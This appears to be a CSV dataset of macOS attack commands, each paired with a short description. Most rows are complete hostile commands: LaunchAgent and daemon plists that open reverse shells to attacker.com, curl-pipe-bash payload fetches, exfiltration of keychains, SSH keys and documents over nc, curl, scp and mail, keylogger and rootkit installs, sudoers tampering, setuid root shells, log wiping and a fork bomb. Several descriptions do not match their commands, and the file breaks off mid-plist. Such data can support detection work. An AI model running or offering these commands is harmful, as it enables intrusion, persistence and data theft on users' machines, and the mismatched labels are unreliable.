"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.remoteaccess</string><key>ProgramArguments</key><array><string>/usr/bin/python</string><string>/tmp/remote_access.py</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.malicious.remoteaccess.plist && launchctl load ~/Library/LaunchAgents/com.malicious.remoteaccess.plist","Persistence via malicious plist to maintain unauthorized remote access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.reverse</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist file to establish a reverse shell on system startup."
"sudo cp -p /path/to/malicious_extension.kext /Library/Extensions/ && sudo kextload /Library/Extensions/malicious_extension.kext","Persistence via malicious kernel extension loaded on startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load -w /Library/LaunchDaemons/com.malicious.daemon.plist","Establishing a reverse shell using a launch daemon."
"sudo defaults write /System/Library/LaunchDaemons/com.apple.some_system_daemon ProgramArguments -array-add '/path/to/arbitrary_code.sh'","Hijacking a system daemon to execute arbitrary code."
"echo 'Defaults env_reset, env_delete+=LD_PRELOAD' | sudo EDITOR='tee -a' visudo","Privilege escalation by exploiting sudo misconfigurations through environment variable manipulation, specifically by overwriting env_keep."
"curl -s http://malicious-url.com/keylogger -o ~/.hidden_keylogger && chmod +x ~/.hidden_keylogger && nohup ~/.hidden_keylogger &","A command that installs a keylogger to capture keystrokes and saves them to a hidden file."
"echo ""* * * * * curl --data-binary @~/.keystroke_log http://attacker-server.com/upload"" | crontab -","A snippet to periodically send recorded keystroke data to a remote server."
"ps -A | grep -i 'application_name' >> ~/Library/Logs/application_usage.log","A command to monitor and log application usage patterns."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/payload</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist to maintain access and control over a macOS system."
"curl -s http://compromised-website.com/fake-update.sh | sh","Malware installation through a fake software update notification from a compromised website."
"while true; do screencapture -x ~/Desktop/screenshot-$(date +%Y%m%d%H%M%S).png; sleep 300; done","Capturing screenshots periodically to monitor user activity."
"echo 'python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((''attacker.com'',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);""' > /Volumes/FTP_Share/reverse_shell.sh && chmod +x /Volumes/FTP_Share/reverse_shell.sh","Gaining remote access to a macOS system by exploiting anonymous FTP write access to upload a reverse shell script."
"cp /usr/bin/env /tmp/; echo 'echo ""malicious code""' >> /tmp/env; chmod u+s /tmp/env","Injecting malicious code into a setuid executable to perform privilege escalation."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.loginitem</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/osascript</string>
		<string>-e</string>
		<string>tell application \""Finder\"" to display dialog \""Hello World\""</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.loginitem.plist && launchctl load ~/Library/LaunchAgents/com.malicious.loginitem.plist","Persistence via malicious plist file to run a script every login"
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Users/Shared/.hiddenScript.sh"", hidden:true}'","Persistence via login item that opens a hidden script on user login."
"curl -s http://malicious-url.com/install.sh | /bin/bash","Malware installation through a disguised Bash script that downloads and executes a hidden payload."
"echo 'kextload /Library/Extensions/hiddenrootkit.kext' >> /etc/rc.common","Embedding a rootkit into the system by appending a malicious kernel module load command to the system's startup files."
"sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.Boot.plist kernel /System/Library/Kernels/maliciouskernel","Compromise of the macOS bootloader to maintain persistence and control over the system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.backdoor.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.backdoor.agent.plist && launchctl load ~/Library/LaunchAgents/com.backdoor.agent.plist","Persistence via malicious plist to establish a backdoor for remote access."
"while true; do screencapture -x ~/Desktop/screenshot_$(date '+%Y-%m-%d_%H-%M-%S').png; sleep 300; done","User activity monitoring through periodic screenshots."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/app"", hidden:false}'","Persistence via login item addition for remote access"
"mkdir /usr/local/.hidden && touch /usr/local/.hidden/.malicious","Unauthorized directory creation in system paths to hide malicious activities."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell connection on system startup."
"curl -s http://malicious-url.com/kernel_exploit.bin -o /tmp/kernel_exploit.bin && chmod +x /tmp/kernel_exploit.bin && /tmp/kernel_exploit.bin","Escalating privileges using a kernel exploit to gain root access."
"tar czf - ~/Library/Keychains/ | openssl enc -aes-256-cbc -e -pass pass:encryption_key123 | nc -w 3 attacker.com 5555","Exfiltrating sensitive files from the system to a remote server."
"Encryption and exfiltration of documents in PDF format, converting them to a base64 encoded string for transmission.","A scenario involving the automatic transmission of documents from a macOS system with document encryption before exfiltration and file type conversion."
"for f in ~/Documents/*.pdf; do openssl enc -aes-256-cbc -salt -in ""$f"" -out ""$f.enc"" -pass pass:YourPasswordHere; base64 -i ""$f.enc"" | curl -X POST -d @- http://malicious-server.com/upload; done","Provide a relevant code snippet for this scenario."
"sudo visudo -f /etc/sudoers","Privilege escalation by exploiting a misconfigured sudoers file that allows running any command without a password."
"echo 'function ls() { /bin/ls ""$@""; /path/to/malicious/script.sh; }' >> ~/.bash_profile && source ~/.bash_profile","Overriding the 'ls' command with a function to execute a malicious script every time 'ls' is called."
"echo 'export PATH=/malicious/directory:$PATH' >> ~/.bash_profile && source ~/.bash_profile","Tampering with the system PATH to prioritize a malicious directory."
"sudo kextload /Library/Extensions/malicious.kext","Persistence via malicious kernel extension loaded at boot time."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/HiddenApp.app"", hidden:true}'","Adding a hidden application to Login Items for persistent execution upon user login."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>\n<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">\n<plist version=""1.0"">\n<dict>\n	<key>Label</key>\n	<string>com.malicious.agent</string>\n	<key>ProgramArguments</key>\n	<array>\n		<string>/usr/bin/curl</string>\n		<string>-L</string>\n		<string>http://malicious-url.com/script.sh</string>\n		<string>|</string>\n		<string>/bin/bash</string>\n	</array>\n	<key>StartInterval</key>\n	<integer>300</integer>\n</dict>\n</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Creating a launch agent for ongoing control that executes a script periodically."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.bounceftp</string>
 <key>ProgramArguments</key>
 <array>
 <string>bash</string>
 <string>-c</string>
 <string>echo ""quote site exec cp /Users/Shared/.hidden /Users/Shared/.malicious; quit"" | ftp -n victim.site</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.bounceftp.plist && launchctl load ~/Library/LaunchAgents/com.malicious.bounceftp.plist","Persistence via malicious plist leveraging FTP misconfigurations to initiate an FTP bounce attack"
"curl -o malicious.dmg http://malicious-url.com/malicious.dmg && hdiutil attach malicious.dmg && cp /Volumes/MaliciousApp/MaliciousApp.app /Applications/","Malware installation via drive-by download when a user unknowingly downloads a malicious dmg file."
"osascript -e 'tell application ""Mail"" to open (posix file ""/path/to/malicious.pdf"")'","Email attachment exploit where an attacker sends a crafted email with a malicious PDF file that executes code when opened."
"/usr/bin/env python -c 'import urllib2; exec(urllib2.urlopen(""http://malicious-url.com/payload.py"").read())'","Malicious PDF attachment that downloads and executes a secondary payload when the PDF is opened."
"sudo cp /path/to/malicious/daemon.plist /Library/LaunchDaemons/ && sudo launchctl load /Library/LaunchDaemons/daemon.plist","Persistence mechanism by installing a malicious daemon service."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.loginitem</string><key>ProgramArguments</key><array><string>/usr/local/bin/malicious_script.sh</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.malicious.loginitem.plist && launchctl load ~/Library/LaunchAgents/com.malicious.loginitem.plist","Persistence via malicious plist in macOS to execute a downloaded script at login."
"osascript -e 'tell application ""System Events"" to get the name of every login item' | grep -q 'Keylogger' || echo 'osascript -e ""tell application \""System Events\"" to keystroke (do shell script \""log stream --predicate \\\""eventMessage contains \\\\\\\""keystroke\\\\\\\""\\\"" --info\"")""' >> /Users/$(whoami)/Library/Scripts/Keylogger.app","Capturing user keystrokes by appending a script to an existing login item."
"find ~/Documents -type f -name '*.pdf' -exec grep -l 'confidential' {} \; | xargs tar -cvzf /tmp/sensitive_documents.tgz && echo 'Please find the attached documents.' | mail -s 'Sensitive Documents' -A /tmp/sensitive_documents.tgz attacker@example.com","A script is used to search for PDF documents containing sensitive information and email them to an external address using macOS's built-in mail command."
"echo 'curl -fsSL http://malicious-url.com/payload.sh | sh' > ~/.launch.sh && chmod +x ~/.launch.sh && echo '@reboot ~/.launch.sh' | crontab -","Persistence via malicious startup script that executes a payload from a remote server"
"curl -s http://vulnerable-server.com/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd -o /tmp/passwd","Gaining remote access through a vulnerability in Apache server that allows directory traversal."
"curl -s http://compromised-website.com/malware.dmg > /tmp/malware.dmg && hdiutil attach /tmp/malware.dmg && cp -R /Volumes/malware/malware.app /Applications/","Infection of macOS system through drive-by download from a compromised website triggering malicious pop-ups."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.loginitem</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/osascript</string>
		<string>-e</string>
		<string>do shell script ""/path/to/malicious/script.sh""</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.loginitem.plist && launchctl load ~/Library/LaunchAgents/com.malicious.loginitem.plist","Persistence via malicious plist file added to LaunchAgents to execute a script every login."
"echo 'Defaults env_keep += ""LD_PRELOAD""' >> /etc/sudoers && echo '/tmp/exploit.so' > /etc/ld.so.preload && sudo -i","Privilege escalation by exploiting the env_reset option in sudoers to retain environment variables."
"echo 'Jan 01 00:00:00 fakehost malicious_event: user authentication failure for user admin' >> /var/log/system.log","Log file tampering by appending false entries to system logs."
"osascript -e 'do shell script ""echo \""int main() {setuid(0); system(\""/bin/sh\"")}\"" > /tmp/rootshell.c && gcc -o /tmp/rootshell /tmp/rootshell.c && chmod u+s /tmp/rootshell && /tmp/rootshell"" with administrator privileges'","Injecting code into a privileged process on macOS using task_for_pid to gain elevated privileges."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash","Persistence mechanism via a cron job that downloads and executes a script every hour."
"cp ~/.ssh/id_rsa /tmp/; curl --upload-file /tmp/id_rsa http://malicious-url.com/upload_ssh_key; echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config; echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config; launchctl stop com.openssh.sshd; launchctl start com.openssh.sshd;","Persistence via SSH keys theft and unauthorized remote access setup."
"tar -czvf sensitive_data.tar.gz /path/to/sensitive/files && scp -i /path/to/private/key sensitive_data.tar.gz user@remotehost:/path/to/destination","Compressing sensitive files in a directory and exfiltrating them via SSH using scp with SSH key-based authentication."
"cp /usr/bin/env /tmp && echo '#!/bin/sh' > /tmp/env && echo '/bin/sh' >> /tmp/env && chmod +x /tmp/env && PATH=/tmp:$PATH /path/to/vulnerable/setuid/binary","Injecting code into a privileged process by exploiting a setuid binary."
"sudo python -c 'import os, pty, socket; lhost, lport = ""attacker.com"", 4444; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(""HISTFILE"",""/dev/null""); pty.spawn(""/bin/bash""); s.close()' &","A malicious actor wants to track user activity by logging keyboard inputs on a macOS system."
"while true; do ps -A > /tmp/monitored_apps.txt; sleep 60; done &","A scenario where a user's application usage is being tracked by a malicious script that monitors open applications."
"echo 'while true; do top -l 1 >> /tmp/.hiddenlog; sleep 60; done' &","Persistence via top command scripting that bypasses user permission checks"
"ps aux | grep root","A scenario where the ps command is used to monitor processes and identify potential targets for privilege escalation."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/payload.sh | /bin/bash","Persistence via malicious cron job that downloads and executes a script every hour."
"echo '*/30 * * * * /usr/sbin/chown root:wheel /tmp/.hidden/rootkit && chmod u+s /tmp/.hidden/rootkit && /tmp/.hidden/rootkit' | crontab -","Privilege escalation by scheduling a rootkit to execute as a cron job and masquerade as a system process."
"*/10 * * * * screencapture ~/Desktop/capture.png && openssl enc -aes-256-cbc -salt -in ~/Desktop/capture.png -out ~/Desktop/encrypted_capture.enc -k secret_password && curl --upload-file ~/Desktop/encrypted_capture.enc ftp://attacker.com/uploads/","Persistence via automated screen capture and encrypted image transfer to a remote server."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/path/to/malicious.app"", hidden:false}'","Persistence via scripting additions that execute upon user login."
"osascript -e 'tell app ""ARDAgent"" to do shell script ""bash >& /dev/tcp/attacker.com/5555 0>&1""'","Persistent backdoor installation using macOS remote desktop feature vulnerabilities."
"touch ~/.hidden_config && echo 'export HISTFILE=/dev/null' >> ~/.hidden_config && source ~/.hidden_config","Hidden files are being created to evade file system monitoring."
"for f in /var/log/*.log; do > $f; done","Log files are being altered to prevent detection of unauthorized activities."
"find / -perm -4000 -type f -exec ls -la {} \;","Privilege escalation by exploiting setuid binaries on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.keylogger</string><key>ProgramArguments</key><array><string>/usr/bin/python</string><string>/Users/Shared/.malicious/keylog.py</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence of keyboard input logging through Launch Agents."
"find / -perm -4002 -type f -exec ls -la {} + 2>/dev/null","Privilege escalation by abusing world-writable setuid files on a macOS system."
"sudo fs_usage | grep -w chmod","Monitoring changes to setuid files to detect potential security breaches."
"zip -er encrypted_docs.zip ~/Documents/Sensitive/*","Compressing and encrypting sensitive documents before exfiltration."
"cat /path/to/image.jpg encrypted_docs.zip > hidden_image.jpg","Concealing the encrypted zip file within an image."
"osascript -e 'do shell script ""launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist"" with administrator privileges'","Persistence mechanism using scripting additions to load a malicious Launch Daemon for privilege escalation."
"0 * * * * curl -fsSL http://malicious-url.com/payload.sh | sh","Persistence via cron job to download and execute a script every hour."
"EDITOR='sh -c ""echo \""* * * * * /path/to/malicious/script.sh\"" >> /etc/crontab""' crontab -e","Privilege escalation by inserting a script into the root's crontab using an editor with elevated privileges."
"(crontab -l 2>/dev/null; echo ""* * * * * /usr/bin/env bash -c '. <(curl -s http://malicious-url.com/hide.sh)' > /dev/null 2>&1"") | crontab -","Using cron jobs for persistence by creating a hidden cron job that executes a malicious script."
"(crontab -l 2>/dev/null; echo ""* * * * * /bin/bash -c \\""$((0x2f62696e2f7368)) \\""$((0x2d632920))\\""echo \\\""$((0x2f62696e2f7368))\\\"" > \\\""$((0x2f746d702f2e68696464656e))\\\""\\"""" | xxd -r -p | sh"") | crontab -","Obfuscating a cron job entry to evade detection and maintain persistence."
"echo 'export PATH=/malicious/directory:$PATH' >> ~/.bash_profile && source ~/.bash_profile","Exploiting the PATH environment variable to execute a malicious binary with the same name as a system command."
"curl -s http://malicious-url.com/install.sh | bash","Malware installation using a disguised curl command to retrieve a script from a remote server and execute it."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bash_profile","Rootkit embedding by appending a malicious script to the local user's .bash_profile for persistent execution."
"DYLD_INSERT_LIBRARIES=/path/to/malicious/library.dylib /bin/launch_target_process","Process hooking to monitor and manipulate system calls by injecting code into running processes."
"sudo kextload /path/to/malicious_extension.kext","System call table modification to intercept and alter system operations using a kernel extension."
"curl -s http://malicious-url.com/zero-day-exploit.dmg > /tmp/exploit.dmg && hdiutil attach /tmp/exploit.dmg && cp /Volumes/Exploit/Install.pkg ~/Downloads/ && installer -pkg ~/Downloads/Install.pkg -target /","Malware installation through a zero-day exploit attachment received via a spear phishing email targeting macOS systems."
"sudo tcpdump -i any -w /tmp/capture.pcap","Malicious use of tcpdump to capture all network traffic and save to a file for exfiltration."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Alteration of the sudoers file to grant unauthorized admin privileges."
"*/30 * * * * zip -r /tmp/documents_backup.zip ~/Documents && /usr/bin/curl -X PUT -T /tmp/documents_backup.zip https://cloud-storage-service.com/upload?api_key=1234567890abcdef","Automatic exfiltration of documents from a macOS system to a cloud storage service using a scheduled cron job."
"chmod 6777 /etc/sudoers","Privilege escalation by exploiting weak file permissions on sensitive files."
"sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.auditd.plist","Disabling file access auditing to avoid detection."
"cp /bin/sh /tmp/sh; chmod +s /tmp/sh; /tmp/sh -p","Exploiting setuid binaries to gain root access."
"sudo arp -s <target_ip> <fake_mac> && tcpdump -i en0 -nn -w dumpfile.pcap","Intercepting network traffic by performing ARP poisoning on a macOS system."
"while true; do screencapture -x ~/Desktop/screenshot-$(date +%Y%m%d%H%M%S).png; sleep 300; done","Capturing screenshots periodically to monitor user activity."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc2E7x... malicious_key' >> ~/.ssh/authorized_keys","Persistence via SSH authorized_keys manipulation to insert a malicious public key."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.reverse</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist file to establish a reverse shell on system startup."
"tar -czvf sensitive-documents.tar.gz ~/Documents/sensitive/","Compressing sensitive files located in the Documents directory into a single archive using tar."
"scp sensitive-documents.tar.gz user@remote-server.com:/path/to/destination","Exfiltrating the compressed archive of sensitive documents over SCP to a remote server."
"sudo tcpdump -i any -w ~/Desktop/user_activity.pcap","Capturing network packets on a macOS system to monitor user activity."
"scp ~/Desktop/user_activity.pcap attacker@malicious-server.com:/data_collection/","Extracting and transferring network packet data from a macOS system to an external server."
"sudo tcpdump -i any port 53 -w ~/Desktop/dns_queries.pcap","Monitoring DNS queries to track websites visited by a user on a macOS system."
"launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via launchd by loading a malicious agent."
"bash -i >& /dev/tcp/attacker.com/4444 0>&1","Establishing a reverse shell to maintain remote access."
"sudo mv /tmp/.hidden /usr/local/bin/.hidden && echo 'alias ls=""ls /.hidden""' >> ~/.bash_profile","Rootkit installation using a hidden file in the system directory."
"sudo echo 'pfctl -a com.apple/250.ApplicationFirewall -sr add pass out quick on en0 all' >> /etc/pf.conf && sudo pfctl -f /etc/pf.conf","Hooking the network stack to monitor and manipulate outgoing connections."
"ps aux | grep -v 'process_to_hide' > /tmp/filtered_process_list && mv /tmp/filtered_process_list /tmp/process_list","Malicious actors may attempt to hide their processes from system monitoring tools to evade detection."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.stealth.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-fsSL</string>
		<string>http://malicious-url.com/hidden_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>LaunchOnlyOnce</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.stealth.agent.plist && launchctl load ~/Library/LaunchAgents/com.stealth.agent.plist","Stealth launch agents can be used to persistently execute hidden malicious activities on a macOS system."
"osascript -e 'tell app ""ARDAgent"" to do shell script ""echo $(whoami) > /tmp/creds && scp /tmp/creds attacker@malicious-server.com:/stolen_creds""'","Malicious actors are using remote desktop protocol exploits to perform RDP credential theft on macOS systems."
"open /path/to/malicious_attachment; curl http://malicious-url.com/payload.sh | sh","Malicious payload execution from an email attachment exploiting a zero-day vulnerability."
"sudo echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo chmod 644 /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Persistence mechanism involving a launch daemon that executes a malicious script on system startup."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/keylogger.app"", hidden:false}'","Persistence of a keylogger by adding it to the user's login items."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell on system boot."
"find ~/Documents -type f -name '*.confidential' -exec gpg --encrypt --recipient 'recipient@example.com' {} \; -exec echo 'File {} has been encrypted.' \; -exec mail -s 'Encrypted Confidential File' recipient@example.com -A {}.gpg \;","Data exfiltration by emailing confidential information after detecting sensitive files and encrypting them before transmission."
"0 * * * * /usr/bin/curl -s http://malicious-url.com/script.sh | /bin/bash","Persistence mechanism using a cron job to download and execute a script every hour."
"curl -s http://malicious-url.com/install.sh | /bin/bash","Malware installation via a disguised Bash script downloaded from the internet."
"hdiutil attach http://malicious-url.com/rogue.dmg -nobrowse; cp -R /Volumes/RogueApp/RogueApplication.app /Applications/","Trojan applications being embedded into the system through a rogue application disguised as a legitimate one."
"sudo kextload /Library/Extensions/malicious.kext","Rootkit embedding by appending a malicious kernel extension to the authorized kexts."
"nc -l 9999 > /tmp/connection &","Creating stealth network listeners that bind to a port and wait for incoming connections."
"while true; do cat /dev/null > /tmp/keystroke.log; sleep 10; done &","Keyboard input logging using macOS native tools."
"while true; do screencapture -x ~/Library/.hidden/screenshot-$(date +%Y%m%d%H%M%S).png; sleep 300; done &","Capturing screenshots periodically and saving them to a hidden directory."
"echo ""0 * * * * /bin/bash -c \""$(curl -fsSL http://malicious-url.com/script.sh)\"""" | crontab -","Persistence on macOS by creating a cron job to download and execute a remote script every hour."
"find /some/directory -type f -exec chmod +x {} \;","A scenario where a script recursively changes file permissions in a directory to grant execution rights indiscriminately, potentially allowing the execution of unauthorized or malicious scripts."
"cp /bin/sh /tmp/privileged_sh && chmod u+s /tmp/privileged_sh","Privilege escalation by exploiting writable setuid binaries."
"zip -er encrypted_files.zip /path/to/sensitive/data/*","Compressing sensitive files in a directory and encrypting the archive with a password, bypassing file access permissions for zip."
":(){ :|:& };:","Malicious command to create a fork bomb causing system resource exhaustion on macOS."
"open /path/to/malicious.app","Malware installation through a user executing a malicious payload received via email attachment."
"bash -c ""$(curl -fsSL http://phishing-link.com/install.sh)""","Executing a script that was downloaded from a phishing email link to establish persistent access."
"tar czf - ~/.ssh/ | curl -F 'file=@-' http://attacker-server.com/upload","Spear-phishing attack that tricks the user into running a command that exfiltrates the .ssh directory to a remote server."
"sudo tcpdump -i en0 -w ~/Desktop/vpntraffic.pcap 'port 1194'","Intercepting data from unpatched VPN services using a man-in-the-middle attack."
"zip -er encrypted_docs.zip /path/to/sensitive/documents/ && echo 'Subject: Encrypted Documents' | sendmail -A gmail -a encrypted_docs.zip -t target@example.com","Compressing sensitive documents into a password-protected zip file before exfiltration."
"osascript -e 'do shell script ""echo 'while :; do curl -fsSL http://malicious-url.com/payload.sh | bash; sleep 300; done' > /Library/Scripts/malicious_script.sh && chmod +x /Library/Scripts/malicious_script.sh && (crontab -l 2>/dev/null; echo ""*/5 * * * * /Library/Scripts/malicious_script.sh"") | crontab -"" with administrator privileges'","Persistence via scripting addition that loads a malicious script to execute periodically."
"mkdir ~/Library/.hidden && echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.hidden.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/script.sh | bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
